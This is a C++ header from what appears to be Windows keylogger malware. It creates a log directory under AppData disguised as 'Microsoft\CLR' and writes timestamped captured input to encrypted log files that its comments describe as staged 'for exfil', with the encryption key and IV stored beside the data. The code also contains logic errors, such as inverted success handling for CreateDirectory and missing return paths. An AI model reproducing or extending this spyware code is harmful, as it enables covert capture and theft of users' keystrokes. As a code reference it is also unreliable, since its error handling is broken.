#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <Windows.h>
#include "Auxiliary.h"
#include "Transformer.h"

using std::cout;

//We will use this IO system to create files, store logs, deal with paths, etc...

namespace IO
{

	//This function uses stdlib to query the windows env variables and retrieves the path to the AppData folder

	std::string getAppDataPath(const bool appendSeperator = false)
	{
		std::string appdataDir = getenv("APPDATA");
		std::string fullPath = appdataDir + "\\Microsoft\\CLR";
		return fullPath + (appendSeperator ? "\\" : "");
	}

	//The function below will create a new directory within wich we will store our logs

	bool createDirectory(std::string dirPath)
	{
		/* All this mumbo jumbo to convert the string object passed in 
		into a LPCWSTR which the WinAPI function accepts. */

		std::wstring tmp = std::wstring(dirPath.begin(), dirPath.end());
		LPCWSTR dirPath2 = tmp.c_str();

		/* This if funnel simply deals with the result of trying to create a directory. If it is successful,
		then return true, if the target directory already exists, then also return true, however, if the target
		path could not be located, then return false. */

		if (CreateDirectory(dirPath2, NULL) == 0)
		{
			Auxiliary::logError("IO::createDirectory() - Directory created!");
			return true;
		}
		else if(GetLastError() == ERROR_ALREADY_EXISTS)
		{
			Auxiliary::logError("IO::createDirectory() - Directory already exists!");
			return true;
		}
		else if (GetLastError() == ERROR_PATH_NOT_FOUND)
		{
			Auxiliary::logError("IO::createDirectory() - Directory path not found!");
			return false;
		}
	}

	//Below is a template function which will take inputs and write it to our key log file for exfil

	template <typename T1>
	std::string writeToLog(const T1 &input)
	{

		//First, we get our path for the AppData folder
		std::string writePath = getAppDataPath(true);

		//We create a structure for the current date and time to use in the filename
		Auxiliary::DateTime dateTime;
		
		//We construct a filename with the date, time, and proper extension and seperators
		std::string logName = dateTime.getDTString(".", "-", "_") + ".log";

		//We now make a full file path using both the log name and the write path
		std::string filePath = writePath + logName;

		//Beginning of file creation and insertion process
		try
		{
			//Create a file object and open it in the correct location with proper permissions
			std::ofstream keyLog;
			keyLog.open(filePath, std::ios::app);
			
			//If log file could not be created for some reason, return empty string
			if (!keyLog)
			{
				Auxiliary::logError("writeToLog() - Could not create log file!");
			}
			else
			{
				std::ostringstream outputStream;

				//Insert given data and timestamps to stream
				outputStream << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << input << std::endl;

				//Encode and saltify that data
				std::string insertData = Transformer::aesEncrypt(outputStream.str());

				insertData +=  "\n\nkey: " + Transformer::getEncryptionKey();
				insertData += "\niv: " + Transformer::getIV();

				//Write that data into the file
				keyLog << insertData;
			}

			//Close the file and return the path to the log

			keyLog.close();
			return filePath;
		}
		catch(...)
		{
			//Do nothing...
		}
	}
}

#endif // !IO_H
